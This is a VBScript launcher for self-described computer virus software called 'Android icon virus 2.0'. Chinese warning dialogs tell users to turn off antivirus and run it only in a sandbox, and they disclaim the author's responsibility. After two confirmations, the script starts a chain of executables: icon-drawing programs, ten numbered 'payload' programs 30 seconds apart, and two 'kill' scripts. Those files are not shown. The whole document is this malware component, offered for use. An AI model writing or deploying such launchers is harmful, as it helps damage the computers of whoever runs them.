X = MsgBox("警告！此程序为电脑病毒，可能会使你的电脑无法正常工作，是否运行？"&vbcr&""&vbcr&"请不要在其他人的电脑或公用电脑上恶意打开此程序！如果你是不小心打开的，请点击“否”按钮取消运行。如果要运行，请确保你是在自己的电脑上运行的，或确保此电脑病毒已经在安全的环境（如虚拟机、沙盒等）中并关闭所有杀毒软件，如果你是在其他人的电脑或公用电脑上运行的此程序，请确保你运行的是此程序的无害版本，然后点击“是”按钮继续。",52,"安卓图标病毒 2.0 (正式版本)")
If X = vbYes Then
Y = MsgBox("这是最后的警告！！！"&vbcr&""&vbcr&"你真的要运行吗？运行后，你的电脑可能会无法正常工作！如果你在其他人的电脑或公用电脑上运行此程序的有害版本，那么你需要承担运行此程序所造成的损失以及相应法律责任！此电脑病毒作者不负该责任！！！",52,"安卓图标病毒 2.0 (正式版本)")
If Y = vbYes Then
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("drawxugeicon.exe")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("drawandroidicon.exe")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload1android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload2android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload3android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload4android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload5android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload6android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload7android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload8android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload9android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload10android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("wscriptandroid.exe kill1.vbs")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("wscriptandroid.exe kill2.vbs")
else
End If
else
End If